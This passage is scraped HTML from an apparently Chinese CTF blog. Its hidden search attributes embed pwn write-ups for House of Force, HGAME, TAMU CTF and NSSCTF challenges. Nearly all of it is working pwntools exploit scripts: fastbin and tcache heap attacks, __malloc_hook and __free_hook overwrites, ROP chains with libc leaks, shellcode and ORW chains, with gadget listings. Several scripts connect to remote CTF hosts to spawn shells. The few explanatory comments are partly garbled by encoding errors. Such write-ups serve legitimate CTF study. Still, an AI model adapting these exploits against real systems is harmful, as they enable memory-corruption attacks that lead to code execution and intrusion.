    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;item:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,str(n))

def getshell():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;5&amp;quot;)

gdb.attach(io)
pause()

add(0x18,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;bbb&amp;quot;) #1
edit(1,0x58,cyclic(0x40)+p64(0)+p64(0xFFFFFFFFFFFFFFFF))

offset=-0x98
magic=0x400d49

add(offset,b&amp;quot;&amp;quot;) #2

add(0x18,p64(magic)*2)
getshell()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰πüÂèØ‰ª•fastbin attackÔºö&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26837)
io=process(&amp;quot;./bamboobox&amp;quot;)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(s,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;item:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;name:&amp;quot;,str(s))
    io.sendafter(b&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendafter(b&amp;quot;item:&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

add(0x18,b&amp;quot;e&amp;quot;) #0
add(0x18,b&amp;quot;a&amp;quot;) #1
add(0x90,b&amp;quot;c&amp;quot;) #2
add(0x10,b&amp;quot;d&amp;quot;) #3

edit(0,0x20,cyclic(0x10)+p64(0)+p64(0xc1))
delete(1)
add(0x10,b&amp;quot;aaaaaaaa&amp;quot;)
show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
one_gadget=[0x45206,0x4525a,0xef9f4,0xf0897]
shell=leak_addr+one_gadget[1]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
realloc=leak_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]

add(0x60,b&amp;quot;/bin/sh&amp;quot;)
add(0x20,b&amp;quot;/bin/sh&amp;quot;)
delete(2)
payload=cyclic(0x18)+p64(0x21)+cyclic(0x18)+p64(0x71)+p64(malloc_hook-0x23)
edit(0,len(payload),payload)

add(0x60,b&amp;quot;aaa&amp;quot;)
add(0x60,cyclic(0xb)+p64(shell)+p64(realloc))

io.sendlineafter(b&amp;quot;choice:&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;name:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()

# 0x45206 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4525a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xef9f4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf0897 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">House of force</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/Pr8A1aCmZ/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNÔºö&lt;/h3&gt;
&lt;h4 id=&#34;fast_note&#34;&gt;fast_note:&lt;/h4&gt;
&lt;p&gt;uaf+fastbin attack,Ê≠§È¢òÈúÄË¶ÅreallocË∞ÉÂÅèÁßªÊâçËÉΩÊâìÈÄöone_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./vuln&amp;quot;)
# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28391)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
add(0,0x60,b&amp;quot;qqq&amp;quot;) #0
add(1,0x60,b&amp;quot;www&amp;quot;) #1
add(2,0x80,b&amp;quot;eee&amp;quot;) #2
add(3,0x10,b&amp;quot;rrr&amp;quot;) #3

delete(2)
add(4,0x80,b&amp;quot;A&amp;quot;*7+b&amp;quot;b&amp;quot;) #4
show(4)
#0,1,4,3
io.recvuntil(b&amp;quot;b&amp;quot;)
libc_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x58-0x3C4B20
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=libc_addr+one_gadget[3]

# gdb.attach(io)
# pause()

delete(0)
delete(1)
delete(0) #0-&amp;gt;1-&amp;gt;0

add(5,0x60,p64(malloc_hook-0x23))
add(6,0x60,b&amp;quot;aaa&amp;quot;)
add(7,0x60,b&amp;quot;qqq&amp;quot;)
add(8,0x60,cyclic(0xb)+p64(shell)+p64(realloc+0x6))

io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;9&amp;quot;)
io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(0x60))

io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;editable_note&#34;&gt;editable_note:&lt;/h3&gt;
&lt;p&gt;tcachebin,uaf+free_hook&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#one_gadgetÊù°‰ª∂ÈôêÂà∂Â§™Â§ö‰∫Ü,Êâìfree_hook
from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28799)
# io=process(&amp;quot;./vuln&amp;quot;)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)    
# pause()
    
for i in range(8):
    add(i,0x80)  
#8ÂùóÔºåÂâç7ÂùófreeÂ°´Êª°tcachebin,ÊúÄÂêé‰∏ÄÂùófreeËøõÂÖ•unsortedbin
add(8,0x10)
#Èò≤Ê≠¢unlink‰∏étop_chunkÂêàÂπ∂
for i in range(8):
    delete(i)
    
show(7) #uaf
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

edit(6,p64(free_hook))
add(9,0x80)
add(10,0x80)
edit(10,p64(sys_addr))

add(11,0x20)
edit(11,b&amp;quot;/bin/sh&amp;quot;)
delete(11)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;new_fast_note&#34;&gt;new_fast_note:&lt;/h3&gt;
&lt;p&gt;Ê≠§È¢òÂ≠òÂú®uafÔºåÊ≤°ÊúâeditÂáΩÊï∞ÔºåÂèØ‰ª•Âà©Áî®house of botcakeÂàõÈÄ†chunk overlapÊù•ÂÆûÁé∞‰ªªÊÑèÂú∞ÂùÄÂàÜÈÖçÔºåÂä´ÊåÅfree_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;house of botcakeÔºö
ÁªïËøá tcache-&amp;gt;key ÁöÑÊ£ÄÊü•Ôºö

Áî≥ËØ∑ 7 ‰∏™Â§ßÂ∞èÁõ∏ÂêåÔºåÂ§ßÂ∞èÂ§ß‰∫é 0x80 ÁöÑ chunkÔºåÂÜçÁî≥ËØ∑‰∏â‰∏™ÔºåÂàÜÂà´‰∏∫ chunk A Âíå chunkB Âíå chunk C
ÈáäÊîæÂâç 7 ‰∏™Âíå chunk AÔºåÂâçÈù¢ 7 ‰∏™ÈÉΩ‰ºöËøõÂÖ•Âà∞ tcachebin ÈáåÈù¢Ôºåchunk A ËøõÂÖ•Âà∞ unsortedbin
ÈáäÊîæ chunk BÔºåÂàô chunk B ‰ºöÂíå chunk A ÂêàÂπ∂
‰ªé tcachebin ÂàÜÈÖçËµ∞‰∏Ä‰∏™
ÂÜçÊ¨°ÈáäÊîæ chunk BÔºåÊ≠§Êó∂ B ÂêåÊó∂Â≠òÂú®‰∏é unsortedbin Âíå tcachebin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(b&amp;quot;node3.anna.nssctf.cn&amp;quot;,28740)
# io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
        
# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x90,b&amp;quot;/bin/sh&amp;quot;)

add(8,0x90,b&amp;quot;/bin/sh&amp;quot;)
add(9,0x90,b&amp;quot;/bin/sh&amp;quot;)
add(10,0x10,b&amp;quot;/bin/sh&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

delete(8)

add(11,0x90,b&amp;quot;/bin/sh&amp;quot;)

delete(8)

add(12,0xc0,cyclic(0xa0)+p64(free_hook))
add(13,0x90,b&amp;quot;qqq&amp;quot;)
add(14,0x90,p64(sys_addr))

delete(11)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME week2 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/YqcmcWPUD/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;inspector-gadget&#34;&gt;inspector-&lt;strong&gt;gadget&lt;/strong&gt;:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./inspector-gadget&amp;quot;)
io=remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;inspector-gadget&amp;quot;)
elf=ELF(&amp;quot;./inspector-gadget&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

me=0x4011a3
pop_rdi_ret=0x40127b
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.recvuntil(b&amp;quot;pwn me\n&amp;quot;)
payload=cyclic(0x18)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(me)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
payload=cyclic(0x18)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)

io.recvuntil(b&amp;quot;pwn me\n&amp;quot;)
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401274 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401276 : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401278 : pop r14 ; pop r15 ; ret
# 0x000000000040127a : pop r15 ; ret
# 0x0000000000401273 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401277 : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000401129 : pop rbp ; ret
# 0x000000000040127b : pop rdi ; ret
# 0x0000000000401279 : pop rsi ; pop r15 ; ret
# 0x0000000000401275 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401016 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;randomness&#34;&gt;randomnessÔºö&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./randomness&amp;quot;)
io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;randomness&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

puts_got=0x403448
win=0x4011d3

io.recvuntil(b&amp;quot;seed:\n&amp;quot;)
io.sendline(str(puts_got))
cs.srand(0)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;guess:\n&amp;quot;)
# io.sendline(str(cs.rand()))
payload=str(win)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;sea-shells&#34;&gt;sea-shells:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sea-shells&amp;quot;)
io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;sea-shells&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
# sc=b&amp;quot;\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&amp;quot;
sc=asm(shellcraft.sh())

io.recvuntil(b&amp;quot;1st number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;2nd number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;3rd number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;4th number: &amp;quot;)
io.sendline(str(cs.rand()))

io.recvuntil(b&amp;quot;work: &amp;quot;)
leak_addr=int(io.recv(12),16)
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;again? (y/n) &amp;quot;)
# io.sendline(b&amp;quot;n&amp;quot;)

payload=b&amp;quot;n&amp;quot;+p64(0)+p64(0)+p64(leak_addr+0x40)+sc
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000000131d : leave ; ret
# 0x0000000000001424 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001426 : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001428 : pop r14 ; pop r15 ; ret
# 0x000000000000142a : pop r15 ; ret
# 0x0000000000001423 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001427 : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000000115f : pop rbp ; ret
# 0x000000000000142b : pop rdi ; ret
# 0x0000000000001429 : pop rsi ; pop r15 ; ret
# 0x0000000000001425 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001016 : ret
# 0x0000000000001072 : ret 0x2f
# 0x000000000000128a : ret 0x8948

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;unlucky&#34;&gt;unlucky:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

while True:
    try:
        # io=process(&amp;quot;./unlucky&amp;quot;)
        io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;unlucky&amp;quot;)
        elf=ELF(&amp;quot;./unlucky&amp;quot;)
        cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
        # gdb.attach(io)
        # pause()
        io.recvuntil(b&amp;quot;: &amp;quot;)
        seed_addr=int(io.recv(15),16)
        print(&amp;quot;seed_addr: &amp;quot;+hex(seed_addr))
        seed_addr+=0x2ec3
        # num=c_int(69)
        # seed_addr = addressof(num)
        print(&amp;quot;seed_addr: &amp;quot;+hex(seed_addr))
        
        cs.srand(seed_addr)
        for i in range(7):
            io.recvuntil(b&amp;quot;:\n&amp;quot;)
            io.sendline(str(cs.rand()))
        
        io.recvline()
        io.interactive()
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
">TAMU wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/eUNOoLG_j/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNÔºö&lt;/h3&gt;
&lt;h4 id=&#34;easy_overflow&#34;&gt;easy_overflowÔºö&lt;/h4&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28949)

ret=0x40101a
payload=cyclic(0x18)+p64(ret)+p64(0x401176)
io.send(payload)
io.sendline(b&amp;quot;exec 1&amp;gt;&amp;amp;0&amp;quot;)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;enter-the-pwn-land&#34;&gt;enter the pwn land:&lt;/h4&gt;
&lt;p&gt;Ê≥®ÊÑèÂèòÈáè‰ºöË¢´ËæìÂÖ•Ë¶ÜÁõñ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28032)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc1.so&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
ret=0x40101a
pop_rdi_ret=0x401313
start=0x4010d0

payload=cyclic(0x28)+p32(1)+p32(0x2c)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))

sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x28)+p32(1)+p32(0x2c)+p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)

io.interactive()
# Gadgets information
# ============================================================
# 0x000000000040130c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040130e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401310 : pop r14 ; pop r15 ; ret
# 0x0000000000401312 : pop r15 ; ret
# 0x000000000040130b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040130f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401313 : pop rdi ; ret
# 0x0000000000401311 : pop rsi ; pop r15 ; ret
# 0x000000000040130d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;simple_shellcode&#34;&gt;simple_shellcode:&lt;/h4&gt;
&lt;p&gt;Ê∫¢Âá∫ÈïøÂ∫¶‰∏çÂ§üÔºåÊûÑÈÄ†readËØªorw shellcodeÔºåÊ≥®ÊÑèshellcodeËµ∑ÂßãÂú∞ÂùÄ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28491)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;shellcode:\n&amp;quot;)
shellcode=asm(&#39;&#39;&#39;
    xor rdi,rdi
    mov rsi,0xCAFE0010
    syscall
    nop
&#39;&#39;&#39;)
io.send(shellcode)
payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0xCAFE0000,0x50)+shellcraft.write(1,0xCAFE0000,0x50))
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;orw&#34;&gt;orw:&lt;/h4&gt;
&lt;p&gt;Á¨¨‰∏ÄÊ¨°ËæìÂÖ•Ê≥ÑÈú≤libcÔºåÁ¨¨‰∫åÊ¨°Ê†àËøÅÁßªÂä´ÊåÅrspÂØÑÂ≠òÂô®Ôºå&lt;s&gt;Ê≥®ÊÑèË∞ÉÊ†àÈóÆÈ¢ò=_=&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28611)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

bss_addr=0x404300   #404220  
read_text=0x4012CF
main=0x4012f0
pop_rdi_ret=0x401393
ret=0x40101a
rsi_r15=0x401391
leave_ret=0x4012be
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.recvuntil(b&amp;quot;task.\n&amp;quot;)
payload=cyclic(0x108)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
open_addr=libc_addr+libc.sym[b&amp;quot;open&amp;quot;]
write_addr=libc_addr+libc.sym[b&amp;quot;write&amp;quot;]
read_addr=elf.plt[b&amp;quot;read&amp;quot;]
pop_rdx_ret=0x142c92+libc_addr
pop_rsi_ret=0x2601f+libc_addr


# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;task.\n&amp;quot;)
payload=cyclic(0x100)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x130,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0x100-0x8)+b&amp;quot;./flag\x00\x00&amp;quot;+p64(bss_addr+0x100+0x8+0x8)+p64(read_text)
payload=payload.ljust(0x130,b&amp;quot;a&amp;quot;)
io.send(payload)

#open
payload=p64(pop_rdi_ret)+p64(0x4042f8)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)
#read
payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(read_addr)
